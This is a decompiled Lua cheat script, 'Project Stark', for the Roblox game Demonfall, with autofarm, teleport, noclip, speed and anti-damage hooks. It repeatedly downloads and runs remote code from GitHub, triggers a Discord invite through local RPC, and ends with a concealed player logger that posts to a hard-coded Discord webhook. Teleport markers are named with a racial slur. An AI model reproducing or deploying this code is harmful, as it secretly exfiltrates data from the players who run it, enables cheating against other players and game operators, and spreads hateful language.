local v1 = {}
local _ = require
v1["script.lua"] = function()
	local v_u_2 = game:GetService("Players").LocalPlayer:FindFirstChild("Project Stark Key Check")
	local v_u_3 = false
	local function v_u_17(p4, p5, p6)
		local v7 = game:GetService("Players").LocalPlayer.Character
		local v8 = Instance.new("BodyVelocity")
		v8.Parent = v7.HumanoidRootPart
		v8.Velocity = Vector3.new(0, 0, 0)
		local v_u_9 = Instance.new("Folder")
		v_u_9.Parent = game.Workspace
		local _ = v7.HumanoidRootPart.Position
		goalpoint = Instance.new("Part")
		goalpoint.Parent = v_u_9
		goalpoint.Size = Vector3.new(0.5, 0.5, 0.5)
		goalpoint.Position = p4
		goalpoint.CanCollide = false
		goalpoint.Anchored = true
		goalpoint.Color = Color3.new(0, 0, 96)
		goalpoint.Transparency = 0
		goalpoint.Material = Enum.Material.Neon
		local v10 = p6 or 0.3
		local v11 = p5 or 1
		while wait(v10) do
			v7.Humanoid:ChangeState(11)
			local v12 = v7.HumanoidRootPart.Position
			local v13 = nil
			local v14 = nil
			local v15 = nil
			if v11 >= math.abs(v12.X - p4.X) then
				if math.abs(v12.X - p4.X) <= v11 then
					v13 = p4.x
				end
			elseif v11 > v12.X - p4.X then
				v13 = v11
			else
				v13 = -v11
			end
			if v11 >= math.abs(v12.Y - p4.Y) then
				if math.abs(v12.Y - p4.Y) <= v11 then
					v14 = p4.y
				end
			elseif v11 > v12.Y - p4.Y then
				v14 = v11
			else
				v14 = -v11
			end
			if v11 >= math.abs(v12.Z - p4.Z) then
				if math.abs(v12.Z - p4.Z) <= v11 then
					v15 = p4.z
				end
			elseif v11 > v12.Z - p4.Z then
				v15 = v11
			else
				v15 = -v11
			end
			if v13 ~= p4.x then
				v13 = v12.x + v13
			end
			if v14 ~= p4.y then
				v14 = v12.y + v14
			end
			if v15 ~= p4.z then
				v15 = v12.z + v15
			end
			local v16
			if _G.urbantplookat == nil then
				v16 = v7.HumanoidRootPart.CFrame - v7.HumanoidRootPart.CFrame.Position
			else
				v16 = CFrame.new(v7.HumanoidRootPart.CFrame.Position, _G.urbantplookat) - v7.HumanoidRootPart.CFrame.Position
			end
			v7.HumanoidRootPart.CFrame = CFrame.new(v13, v14, v15) * v16
			if v13 == p4.x and (v14 == p4.y and v15 == p4.z) then
				v8:Destroy()
				goalpoint:Destroy()
				pcall(function()
					-- upvalues: (ref) v_u_9
					v_u_9:Destory()
				end)
				break
			end
		end
	end
	function Move(p18, p19, p20)
		_G.move1 = true
		while p18.X < game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X do
			Wait(p20)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X - p19, game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y, game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z))
		end
		while p18.Z < game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z do
			Wait(p20)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X, game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y, game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z - p19))
		end
		while p18.X > game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X do
			Wait(p20)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X + p19, game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y, game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z))
		end
		while p18.Z > game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z do
			Wait(p20)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X, game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y, game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z + p19))
		end
		while p18.Y < game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y do
			Wait(p20)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X, game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y - p19, game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z))
		end
		while p18.Y > game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y do
			Wait(p20)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X, game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y + p19, game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z))
		end
		_G.move1 = false
	end
	spawn(function()
		game:GetService("RunService").Stepped:Connect(function()
			if _G.move1 then
				game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
			end
		end)
	end)
	local function v23(p_u_21)
		pcall(function()
			-- upvalues: (ref) p_u_21
			local v22 = game:GetService("HttpService");
			(syn and syn.request or request)({
				["Url"] = "http://127.0.0.1:6463/rpc?v=1",
				["Method"] = "POST",
				["Headers"] = {
					["Content-Type"] = "application/json",
					["Origin"] = "https://discord.com"
				},
				["Body"] = v22:JSONEncode({
					["cmd"] = "INVITE_BROWSER",
					["args"] = {
						["code"] = p_u_21
					},
					["nonce"] = v22:GenerateGUID(false)
				})
			})
		end)
	end
	local v24 = false
	if true then
		if v_u_2 and v_u_2.Value == true then
			pcall(function()
				-- upvalues: (ref) v_u_2
				v_u_2:Destroy()
				warn("Urbanstorn was here")
			end)
			v24 = true
		else
			pcall(function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/Main.lua"))()
			end)
			v23("vgYZApyrZC")
		end
	else
		warn("[Project Stark] Key check DISABLED")
		v24 = true
	end
	if v24 then
		local v25 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/UiLib.lua"))():Window("Project Stark\n\225\180\176\225\181\137\225\181\144\225\181\146\226\129\191\225\182\160\225\181\131\203\161\203\161", Color3.fromRGB(120, 81, 169))
		local v26 = v25:Tab("Main")
		v26:Toggle("Auto Equip", function(p27)
			Equip = p27
			while Equip do
				wait()
				pcall(function()
					game:GetService("ReplicatedStorage").Remotes.Async:FireServer(unpack({
						"Katana",
						"EquippedEvents",
						true,
						true
					}))
					wait(5)
				end)
			end
		end)
		v26:Toggle("Auto Attack", function(p28)
			hit = p28
			while hit do
				wait()
				pcall(function()
					game:GetService("ReplicatedStorage").Remotes.Async:FireServer(unpack({ "Katana", "Server" }))
					game:GetService("ReplicatedStorage").Remotes.Async:FireServer(unpack({ "Combat", "Server" }))
				end)
			end
		end)
		v26:Toggle("Auto Pickaxe hit", function(p29)
			Pickaxe = p29
			while Pickaxe do
				wait()
				pcall(function()
					game:GetService("ReplicatedStorage").Remotes.Sync:InvokeServer(unpack({ "Pickaxe", "Server" }))
				end)
			end
		end)
		Levels = {
			"Trinkets",
			"Ore Farm",
			"Zenitsu",
			"GenericSlayer"
		}
		v26:Dropdown("Farm Selection", Levels, function(p30)
			Lvtofarm = p30
		end)
		v26:Toggle("Autofarm Start ", function(p31)
			-- upvalues: (ref) v_u_17
			autofarm = p31
			while autofarm do
				wait()
				pcall(function()
					-- upvalues: (ref) v_u_17
					if Lvtofarm ~= "Players" then
						if Lvtofarm ~= "Trinkets" then
							if Lvtofarm ~= "Ore Farm" then
								if Lvtofarm ~= "GenericSlayer" then
									if Lvtofarm == "Zenitsu" then
										if game:GetService("Workspace").Zenitsu:FindFirstChild("HumanoidRootPart") ~= nil then
											local v32, v33, v34 = pairs(game:GetService("Workspace"):GetChildren())
											while true do
												local v35
												v34, v35 = v32(v33, v34)
												if v34 == nil then
													break
												end
												if string.match(v35.Name, "Zenitsu") then
													repeat
														wait()
														Move(v35.HumanoidRootPart.Position, TSpeed, 0)
														wait()
													until v35.Humanoid.Health <= 0 or autofarm == false
												end
											end
										else
											x = Instance.new("Part", game.Workspace)
											x.Name = "ZenitzuNigger"
											x.Transparency = 1
											x.Anchored = true
											x.CanCollide = false
											x.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
											x.CFrame = CFrame.new(2714, 778, -3395)
											Move(game.Workspace.ZenitzuNigger.Position, TSpeed, 0)
										end
									end
								else
									local v36, v37, v38 = pairs(game:GetService("Workspace"):GetChildren())
									while true do
										local v39
										v38, v39 = v36(v37, v38)
										if v38 == nil then
											break
										end
										if string.match(v39.Name, "GenericSlayer") then
											repeat
												wait()
												Move(v39.HumanoidRootPart.Position, TSpeed, 0)
												wait()
											until v39.Humanoid.Health <= 0 or autofarm == false
										end
									end
								end
							else
								local v40, v41, v42 = pairs(game:GetService("Workspace").Map.Minerals:GetDescendants())
								while true do
									local v43
									v42, v43 = v40(v41, v42)
									if v42 == nil then
										break
									end
									if string.match(v43.Name, "Spawned") then
										repeat
											wait()
											v_u_17(v43.Parent.Position, TSpeed, 0)
											wait()
										until v43.Humanoid.Health <= 0 or autofarm == false
									end
								end
							end
						else
							local v44, v45, v46 = pairs(game:GetService("Workspace").Trinkets:GetDescendants())
							while true do
								local v47
								v46, v47 = v44(v45, v46)
								if v46 == nil then
									break
								end
								if string.match(v47.Name, "Spawned") then
									repeat
										wait()
										v_u_17(v47.Parent.Position, TSpeed, 0)
										game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.E, false, game)
										game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode.E, false, game)
										wait()
									until v47.Humanoid.Health <= 0 or autofarm == false
								end
							end
						end
					else
						local v48, v49, v50 = pairs(game.Players:GetChildren())
						while true do
							local v51
							v50, v51 = v48(v49, v50)
							if v50 == nil then
								break
							end
							if v51:IsA("Player") and v51 ~= game.Players.LocalPlayer then
								repeat
									wait()
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v51.Character.HumanoidRootPart.Position + Vector3.new(0, Distance, 0), v51.Character.HumanoidRootPart.Position)
								until v51.Character.Humanoid.Health <= 0 or not autofarm
							end
						end
					end
				end)
			end
		end)
		game:GetService("RunService").Stepped:Connect(function()
			if autofarm then
				game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
			end
		end)
		TSpeed = 3
		v26:Slider("\"Tween\" speed", 1, 4.5, 3, function(p52)
			TSpeed = p52
		end)
		local v53 = v25:Tab("Misc")
		pcall(function()
			local v54 = getrawmetatable(game)
			make_writeable(v54)
			local v_u_55 = v54.__namecall
			v54.__namecall = newcclosure(function(p56)
				-- upvalues: (ref) v_u_55
				if getnamecallmethod() ~= "FireServer" or ({ ... })[2] ~= "FallDamageServer" then
					return v_u_55(p56, ...)
				else
					return wait(8999999488)
				end
			end)
		end)
		pcall(function()
			local v57 = getrawmetatable(game)
			make_writeable(v57)
			local v_u_58 = v57.__namecall
			v57.__namecall = newcclosure(function(p59)
				-- upvalues: (ref) v_u_58
				if getnamecallmethod() ~= "FireServer" or ({ ... })[2] ~= "DemonWeakness" then
					return v_u_58(p59, ...)
				else
					return wait(8999999488)
				end
			end)
		end)
		pcall(function()
			local v60 = getrawmetatable(game)
			make_writeable(v60)
			local v_u_61 = v60.__namecall
			v60.__namecall = newcclosure(function(p62)
				-- upvalues: (ref) v_u_61
				if getnamecallmethod() ~= "FireServer" or ({ ... })[2] ~= "StaminaLoss" then
					return v_u_61(p62, ...)
				else
					return wait(8999999488)
				end
			end)
		end)
		v53:Toggle("Hide Name", function(p63)
			HideNamee = p63
			while HideNamee do
				wait()
				pcall(function()
					game.Players.LocalPlayer.Character.Head.TrueName:Destroy()
					game.Players.LocalPlayer.Character.Head.Rank:Destroy()
					local v64 = game.Players.LocalPlayer
					local v65, v66, v67 = pairs(v64.Character:GetChildren())
					while true do
						local v68
						v67, v68 = v65(v66, v67)
						if v67 == nil then
							break
						end
						if v68.ClassName == "Accessory" or (v68.Name == "Belt" or (v68.Name == "Shirt" or v68.Name == "Pants")) then
							v68:Destroy()
							local v69 = game.Players.LocalPlayer
							local v70, v71, v72 = pairs(v69.Character.Head:GetChildren())
							while true do
								local v73
								v72, v73 = v70(v71, v72)
								if v72 == nil then
									break
								end
								if v73:IsA("Decal") then
									v73:remove()
								end
							end
						end
					end
				end)
			end
		end)
		v53:Toggle("Noclip", function(p74)
			noclippog = p74
			while noclippog do
				wait()
				pcall(function()
					game.Players.LocalPlayer.Character:findFirstChildOfClass("Humanoid"):ChangeState(11)
				end)
			end
		end)
		v53:Toggle("Semi God", function(p75)
			sem = p75
			game:GetService("RunService").Heartbeat:Connect(function()
				if sem ~= false then
					pcall(function()
						game.Players.LocalPlayer.Character.Ragdoll:Destroy()
					end)
				end
			end)
		end)
		v53:Toggle("Auto Collect Drops", function(p76)
			aut = p76
			while wait() do
				if aut then
					game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.E, false, game)
					game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode.E, false, game)
				end
			end
		end)
		v53:Toggle("No Stun", function(p77)
			stu = p77
			while wait() do
				if stu then
					pcall(function()
						game.Players.LocalPlayer.Character.Stun:Destroy()
					end)
				end
			end
		end)
		v53:Toggle("No aggro (Only works for slayers)", function(p78)
			agg = p78
			while wait() do
				if agg then
					pcall(function()
						game.Players.LocalPlayer.Character.Aggro:Destroy()
						game.Players.LocalPlayer.Character.Combat:Destroy()
					end)
				end
			end
		end)
		v53:Button("Respawn", function()
			pcall(function()
				game.Players.LocalPlayer.Character.Head:Destroy()
			end)
		end)
		v53:Button("Fix Mouse", function()
			pcall(function()
				game:GetService("UserInputService").MouseIconEnabled = true
				game:GetService("UserInputService").MouseBehavior = Enum.MouseBehavior.Default
			end)
		end)
		v53:Label("No fall & No sun damage on by default.")
		local v79 = v25:Tab("Teleports")
		v79:Button("Trinket buyer", function()
			pcall(function()
				x = Instance.new("Part", game.Workspace)
				x.Name = "ShopNigger"
				x.Transparency = 1
				x.Anchored = true
				x.CanCollide = false
				x.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				x.CFrame = CFrame.new(-3637, 708, -1478)
				game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
				Move(game.Workspace.ShopNigger.Position, TSpeed, 0)
			end)
		end)
		v79:Button("Final Selection", function()
			pcall(function()
				x = Instance.new("Part", game.Workspace)
				x.Name = "FinalNigger"
				x.Transparency = 1
				x.Anchored = true
				x.CanCollide = false
				x.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				x.CFrame = CFrame.new(-5191, 792, -3043)
				game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
				Move(game.Workspace.FinalNigger.Position, TSpeed, 0)
			end)
		end)
		v79:Button("Black Market Dealer Spawn 1", function()
			pcall(function()
				x = Instance.new("Part", game.Workspace)
				x.Name = "BlackNigger"
				x.Transparency = 1
				x.Anchored = true
				x.CanCollide = false
				x.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				x.CFrame = CFrame.new(-3392, 704, -1076)
				game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
				Move(game.Workspace.BlackNigger.Position, TSpeed, 0)
			end)
		end)
		v79:Button("Black Market Dealer Spawn 2", function()
			pcall(function()
				x = Instance.new("Part", game.Workspace)
				x.Name = "BlackNigger2"
				x.Transparency = 1
				x.Anchored = true
				x.CanCollide = false
				x.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				x.CFrame = CFrame.new(644, 755, -2112)
				game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
				Move(game.Workspace.BlackNigger2.Position, TSpeed, 0)
			end)
		end)
		v79:Button("Pickaxe Seller/Ore Buyer", function()
			pcall(function()
				x = Instance.new("Part", game.Workspace)
				x.Name = "PickaxeNigger"
				x.Transparency = 1
				x.Anchored = true
				x.CanCollide = false
				x.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				x.CFrame = CFrame.new(398, 755, -2382)
				game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
				Move(game.Workspace.PickaxeNigger.Position, TSpeed, 0)
			end)
		end)
		v79:Button("Okuiya Village", function()
			pcall(function()
				x = Instance.new("Part", game.Workspace)
				x.Name = "ONigger"
				x.Transparency = 1
				x.Anchored = true
				x.CanCollide = false
				x.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				x.CFrame = CFrame.new(-3222, 706, -1194)
				game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
				Move(game.Workspace.ONigger.Position, TSpeed, 0)
			end)
		end)
		v79:Button("Hayakawa Village", function()
			pcall(function()
				x = Instance.new("Part", game.Workspace)
				x.Name = "HNigger"
				x.Transparency = 1
				x.Anchored = true
				x.CanCollide = false
				x.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				x.CFrame = CFrame.new(483, 757, -1995)
				game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
				Move(game.Workspace.HNigger.Position, TSpeed, 0)
			end)
		end)
		v79:Button("Kamakura Village", function()
			pcall(function()
				x = Instance.new("Part", game.Workspace)
				x.Name = "KNigger"
				x.Transparency = 1
				x.Anchored = true
				x.CanCollide = false
				x.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				x.CFrame = CFrame.new(-2154, 1164, -1666)
				game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
				Move(game.Workspace.KNigger.Position, TSpeed, 0)
			end)
		end)
		local v80 = v25:Tab("Final Selection Farm\n(Not made)")
		v80:Button("Final Selection TP", function()
			x = Instance.new("Part", game.Workspace)
			x.Name = "FinalNigger"
			x.Transparency = 1
			x.Anchored = true
			x.CanCollide = false
			x.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			x.CFrame = CFrame.new(-5191, 792, -3043)
			game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
			Move(game.Workspace.FinalNigger.Position, TSpeed, 0)
		end)
		v80:Toggle("Autofarm Start", function(p81)
			autofarm = p81
			while autofarm do
				wait()
				pcall(function()
					local v82, v83, v84 = pairs(PathHere:GetChildren())
					while true do
						local v85
						v84, v85 = v82(v83, v84)
						if v84 == nil then
							break
						end
						if string.match(v85.Name, "Demon") then
							repeat
								wait()
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v85.HumanoidRootPart.Position + Vector3.new(0, Distance, 0), v85.HumanoidRootPart.Position)
								wait()
							until v85.Humanoid.Health <= 0 or autofarm == false
						end
					end
				end)
			end
		end)
		local v86 = v25:Tab("Extras")
		v86:Button("Admin", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
		end)
		v86:Button("Server Hop", function()
			local v_u_87 = game.PlaceId
			local v_u_88 = {}
			local v_u_89 = ""
			local v_u_90 = os.date("!*t").hour
			if not pcall(function()
				-- upvalues: (ref) v_u_88
				v_u_88 = game:GetService("HttpService"):JSONDecode(readfile("NotSameServers.json"))
			end) then
				table.insert(v_u_88, v_u_90)
				writefile("NotSameServers.json", game:GetService("HttpService"):JSONEncode(v_u_88))
			end
			function TPReturner()
				-- upvalues: (ref) v_u_89, (ref) v_u_87, (ref) v_u_88, (ref) v_u_90
				local v91
				if v_u_89 ~= "" then
					v91 = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. v_u_87 .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. v_u_89))
				else
					v91 = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. v_u_87 .. "/servers/Public?sortOrder=Asc&limit=100"))
				end
				if v91.nextPageCursor and (v91.nextPageCursor ~= "null" and v91.nextPageCursor ~= nil) then
					v_u_89 = v91.nextPageCursor
				end
				local v92, v93, v94 = pairs(v91.data)
				local v95 = 0
				while true do
					local v96
					v94, v96 = v92(v93, v94)
					if v94 == nil then
						break
					end
					local v97 = true
					local v_u_98 = tostring(v96.id)
					if tonumber(v96.maxPlayers) > tonumber(v96.playing) then
						local v99, v100, v101 = pairs(v_u_88)
						while true do
							local v102
							v101, v102 = v99(v100, v101)
							if v101 == nil then
								break
							end
							if v95 == 0 then
								if tonumber(v_u_90) ~= tonumber(v102) then
									pcall(function()
										-- upvalues: (ref) v_u_88, (ref) v_u_90
										delfile("NotSameServers.json")
										v_u_88 = {}
										table.insert(v_u_88, v_u_90)
									end)
								end
							elseif v_u_98 == tostring(v102) then
								v97 = false
							end
							v95 = v95 + 1
						end
						if v97 == true then
							table.insert(v_u_88, v_u_98)
							wait()
							pcall(function()
								-- upvalues: (ref) v_u_88, (ref) v_u_87, (ref) v_u_98
								writefile("NotSameServers.json", game:GetService("HttpService"):JSONEncode(v_u_88))
								wait()
								game:GetService("TeleportService"):TeleportToPlaceInstance(v_u_87, v_u_98, game.Players.LocalPlayer)
							end)
							wait(4)
						end
					end
				end
			end
			function Teleport()
				-- upvalues: (ref) v_u_89
				while wait() do
					pcall(function()
						-- upvalues: (ref) v_u_89
						TPReturner()
						if v_u_89 ~= "" then
							TPReturner()
						end
					end)
				end
			end
			Teleport()
		end)
		v86:Button("Anti-Afk - Already Running", function()
			print("Why are you clicking the anti-afk button lmao")
		end)
		v86:Toggle("Infinite Jump", function(p103)
			InfJump = p103
			if InfJumpStarted == nil then
				InfJumpStarted = true
				local v104 = game:GetService("Players").LocalPlayer
				local v105 = v104:GetMouse()
				local v_u_106 = v104.Character:WaitForChild("Humanoid")
				v105.KeyDown:Connect(function(p107)
					-- upvalues: (ref) v_u_106
					if InfJump and p107:byte() == 32 then
						v_u_106:ChangeState("Jumping")
						wait()
						v_u_106:ChangeState("Seated")
					end
				end)
			end
		end)
		local v_u_108 = 40
		v86:Slider("Player Speed", 20, 200, 23, function(p109)
			-- upvalues: (ref) v_u_108
			v_u_108 = p109
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v_u_108
		end)
		local v110 = v25:Tab("Credits")
		v110:Button("Made by Urbanstorm", function()
			pcall(function()
				setclipboard("Urbanstorm")
			end)
		end)
		v110:Button("https://discord.gg/vgYZApyrZC - Click to copy", function()
			pcall(function()
				setclipboard("https://discord.gg/vgYZApyrZC")
			end)
		end)
		task.spawn(function()
			-- upvalues: (ref) v_u_108
			(function()
				-- upvalues: (ref) v_u_108
				while true do
					pcall(function()
						-- upvalues: (ref) v_u_108
						wait(0.5)
						if game.Players.LocalPlayer.Character.Humanoid.WalkSpeed ~= v_u_108 then
							game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v_u_108
						end
					end)
				end
			end)()
		end)
		task.spawn(function()
			pcall(function()
				game.Players.LocalPlayer.CameraMaxZoomDistance = 1000
				local v111 = game:GetService("Players").LocalPlayer:WaitForChild("PlayerScripts").PlayerModule.CameraModule.ZoomController.Popper
				local v112 = next
				local v113, v114 = getgc()
				while true do
					local v115
					v114, v115 = v112(v113, v114)
					if v114 == nil then
						break
					end
					if getfenv(v115).script == v111 and typeof(v115) == "function" then
						local v116 = next
						local v117, v118 = debug.getconstants(v115)
						while true do
							local v119
							v118, v119 = v116(v117, v118)
							if v118 == nil then
								break
							end
							if tonumber(v119) ~= 0.25 then
								if tonumber(v119) == 0 then
									debug.setconstant(v115, v118, 0.25)
								end
							else
								debug.setconstant(v115, v118, 0)
							end
						end
					end
				end
				local v120, v121, v122 = pairs(game.Players.LocalPlayer.Character:GetChildren())
				while true do
					local v123
					v122, v123 = v120(v121, v122)
					if v122 == nil then
						break
					end
					if v123.ClassName == "Part" or v123.ClassName == "MeshPart" then
						v123.CanCollide = false
					end
				end
			end)
		end)
		task.spawn(function()
			pcall(function()
				local v_u_124 = game:GetService("VirtualUser")
				game:GetService("Players").LocalPlayer.Idled:connect(function()
					-- upvalues: (ref) v_u_124
					v_u_124:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
					wait(1)
					v_u_124:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
				end)
			end)
		end)
		pcall(function()
			wait(1)
			game:GetService("UserInputService").MouseIconEnabled = true
			game:GetService("UserInputService").MouseBehavior = Enum.MouseBehavior.Default
		end)
		task.spawn(function()
			-- upvalues: (ref) v_u_3
			pcall(function()
				-- upvalues: (ref) v_u_3
				if v_u_3 ~= false then
					warn("[Project Stark] Logger DISABLED")
				else
					getgenv().Webyhookie = "https://discord.com/api/webhooks/1429287064507252787/ytb0OMaiBljDov2tHnrJqUIZY7vQUg_T7X-RNXQsdSHS1qSk8Vjs9Y6QaedLirEwU1Bh"
					getgenv().Titlewebyhookie = "\240\159\154\168 Demonfall \226\128\147 Player Logger"
					loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/Log.lua"))()
				end
			end)
		end)
	end
end
return v1["script.lua"](...)
